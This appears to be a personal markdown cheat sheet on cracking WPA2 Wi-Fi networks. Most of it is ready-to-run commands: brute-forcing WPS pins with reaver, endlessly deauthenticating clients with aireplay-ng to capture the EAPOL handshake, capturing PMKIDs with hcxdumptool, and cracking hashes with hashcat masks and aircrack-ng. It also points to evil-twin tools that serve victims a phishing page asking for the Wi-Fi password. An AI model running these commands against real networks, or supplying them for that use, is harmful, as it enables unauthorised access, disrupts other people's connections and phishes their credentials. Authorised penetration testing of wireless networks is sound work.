#cracking #wifi #wpa2 #eapol #4wayhandshake #pmkid

# Hardware: network devices

Recommanded by aircrack for good performances and linux compatibility (work out of the box)
**ALFA AWUS036ACM**
> https://www.amazon.fr/Alfa-AWUS036ACM/dp/B08BJS8FXD

See also : [david bombal video comparing network adapters](https://www.youtube.com/watch?v=5MOsY3VNLK8)

# Evil-twin

Create a new fake access point with the same name as the target router and contentiously disconnect client from the target
when the clients are fed up they will connect to your access point and then you present them with a phishing page to ask them for the wifi password:
- https://github.com/FluxionNetwork/fluxion
- https://github.com/v1s1t0r1sh3r3/airgeddon

# Brute-forcing WPS
The WPS pin can be brute-forced using [reaver](https://github.com/t6x/reaver-wps-fork-t6x)

```bash
reaver -i <monitor_interface> -b <BSSID> -vv # -vv is just for verbosity
# example
reaver -i wlan1mon -b 34:DB:9C:41:44:60 -vv
```

# Capturing the 4 way handshake (EAPOL)

The 4 way handshake is composed of 4 packets based on the EAPOL protocol, exchanged between the router and the client to allow authentication
If a client connect to the router while the attacker is monitoring the network, the attacker would be able to capture the 4 way handshake and crack it locally to retrieve the wpa password
But we are not going to wait for a customer to connect by himself, we can force deauthentication of a client and wait for it's re-connection

> source : https://www.youtube.com/watch?v=WfYxrLaqlN8

```bash
# check your interfaces
ip a
iwconfig

# kill services that can interfer
sudo airmon-ng check kill

# put an interface into monitor mode
sudo airmon-ng start wlan0
sudo airmon-ng # notice the new interface wlan0mon

# discover access point (recon)
sudo airodump-ng wlan0mon # keep the channel and bssid (mac addr) of the target network
sudo airodump-ng wlan0mon -d 90:9A:4A:B8:F3:FB # focus on a specific access point

# capture traffic of a specific bssid
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon # -c for channel and -w for the file where we store the capture

# deauthenticate clients from the network
# do it in another window, while monitoring the traffic with airodump
sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon # -deauth 0 means infinite deauthentication

# a new hack1-01.cap result from your airodump-ng capture, you can open this .cap file with wireshark and filter on "eapol" protocol, if evert thing worked correctly, you should see a 4 way handshake

# restoring managed mode
sudo airmon-ng stop wlan0mon

# restoring service
sudo systemctl start wpa_supplicant
sudo systemctl start NetworkManager
```

# Capturing the PMKID

The PMKID is another hash used by WPA2 that you can try to crack, this time you don't need to have client already connected to the access point and disconnect them while monitoring the traffic
Since hashcat v6.0, you can also combine PMKID and EAPOL in a new format : 22000
This one is more efficient than the older format

> [!quote]+ As explained [here](https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick)
>
> PMKID is a hash that is used for roaming capabilities between APs. The legitimate use of PMKID is, however, of little relevance for the scope of this blog. Frankly, it makes little sense to enable it on routers for personal/private use (WPA2-personal), as usually there is no need for roaming in a personal network.

This method use hashcat format 22000, from a cracking point of view, having all the handshake types in a single file, makes it much more efficient

```bash 
# based on documentation: https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
# you will need 3 tools:
# - hcxdumptool (for capture) it's better to install the latest version from github : https://github.com/ZerBea/hcxdumptool
# - hcxpcapngtool from hcxtools v6.0.0 or higher (for conversion) https://github.com/ZerBea/hcxtools
# - hashcat v6.0.0 or higher (for cracking)
# david bombal ref video : https://www.youtube.com/watch?v=Usw0IlGbkC4

# Stop services that could interfer
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
# capturing traffic
sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=15
# get bssid of the target router (first column on the left)
sudo hcxdumptool --do_rcascan -i wlan0 # you need the bssid to filter the hashes
# You can restart your services
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant
# convert pcapng file to a format that hashcat understand
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng # -E dump the list of essid contained in the pcap and store them in essidlist
# now filter hash.hc22000 to keep only the hash with the bssid that match the target router bssid, a grep should be sufficient

# now crack the hash !
```

# Cracking (with GPU)

## Preparing a cracking instance

- List available hashcat backends (cpu/gpu available to use) : `hashcat -I`
- Installing Nvidia Cuda
    - ref: https://youtu.be/nHDixd-EdEQ?t=545
    - doc: https://www.linode.com/docs/products/compute/compute-instances/guides/install-nvidia-cuda/
    - nvidia toolkit download page: https://developer.nvidia.com/cuda-downloads
- Reboot the server after installation and ssh again
- Check again `hashcat -I` and check nvidia drivers + devices with `nvidia-smi`

### Automated a ready to go linode instance
- This script is only for debian 11 (x86_64) linode instances with nvidia gpus (updated in 2023)
- Run this script as root in bash

```bash
apt update && apt upgrade
apt install build-essential linux-headers-$(uname -r)
wget https://developer.download.nvidia.com/compute/cuda/12.1.1/local_installers/cuda-repo-debian11-12-1-local_12.1.1-530.30.02-1_amd64.deb
dpkg -i cuda-repo-debian11-12-1-local_12.1.1-530.30.02-1_amd64.deb
cp /var/cuda-repo-debian11-12-1-local/cuda-*-keyring.gpg /usr/share/keyrings/
add-apt-repository contrib
apt-get update
apt-get -y install cuda
reboot now
```

### Selecting devices to crack

```bash
# first check hashcat access to available devices
hashcat -I
# select devices by IDs
#  -d, --backend-devices          | Str  | Backend devices to use, separated with commas        | -d 1   
hashcat [...] -d 6,7,8,9
```

### Hashcat command

```bash
# example
hashcat -m 22000 8-digit-wpa2.hc22000 -a 3 ?d?d?d?d?d?d?d?d -d 6,7,8,9 -w 4

# -a 3 => means brute force attack followed by the mask_attack => https://hashcat.net/wiki/doku.php?id=mask_attack
# -w 4 => check workload Profile, this means power consumption, -w 4 is the highest (nightmare)

# cracking a range (pass containing digits only, from 8 to 18)
hashcat -m 22000 10-digit-wpa2.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d -d 6,7,8,9 -w 4

# cracking a range (pass containing digits, lowercase and uppercase, from 10 to 12)
hashcat -m 22000 10-digit-letters-wpa2.hc22000 --increment --increment-min 10 --increment-max 12 -1 ?d?l?u -a 3 ?1?1?1?1?1?1?1?1?1?1?1?1 -d 6,7,8,9 -w 4
# -1 ?d?l?u => we create a custom charset composed of digits, lowercase and uppercase and we use it in the mask_attack
# see attack_mask documentation for more informations


# using a wordlist
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### Aircrack command

```bash
aircrack-ng hack1-01.cap -w wordlist.txt
```

---

sources:
- https://www.youtube.com/watch?v=nHDixd-EdEQ
- https://www.youtube.com/watch?v=Usw0IlGbkC4
- https://www.youtube.com/watch?v=5MOsY3VNLK8
- https://www.youtube.com/watch?v=WfYxrLaqlN8
- https://hashcat.net/wiki/doku.php?id=mask_attack
- https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
